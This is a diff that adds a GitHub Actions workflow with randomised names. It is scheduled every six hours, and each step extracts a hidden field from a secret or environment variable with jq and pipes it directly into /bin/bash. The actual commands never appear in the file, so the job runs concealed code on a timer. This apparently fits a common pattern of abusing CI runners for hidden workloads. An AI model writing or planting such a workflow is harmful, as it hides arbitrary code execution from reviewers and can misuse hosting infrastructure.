@@ -1,0 +1,28 @@
+name: luyizi7654
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '10 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: luyizi7654
+        env:
+          fibip7: ${{ secrets.fibip7 }}
+        run: |
+          echo $fibip7 | jq -r .p90256 | /bin/bash
+          echo $dkkjy002 | jq -r .zf51 | /bin/bash
+          echo $pzq4 | jq -r .i961 | /bin/bash
+          echo $xsu05246 | jq -r .w63758 | /bin/bash
+          echo $yikv2303 | jq -r .i27 | /bin/bash
+          echo $dcybb0 | jq -r .dny49 | /bin/bash
+          echo $z8 | jq -r .hki32269 | /bin/bash
+          echo $pq837 | jq -r .uwdt06532 | /bin/bash
+          echo $xxnej03 | jq -r .wsf94664 | /bin/bash
+          echo $jzt84 | jq -r .t606 | /bin/bash
+          echo $chde9 | jq -r .lidr22805 | /bin/bash
+          echo $vmea2 | jq -r .afyh30675 | /bin/bash
+
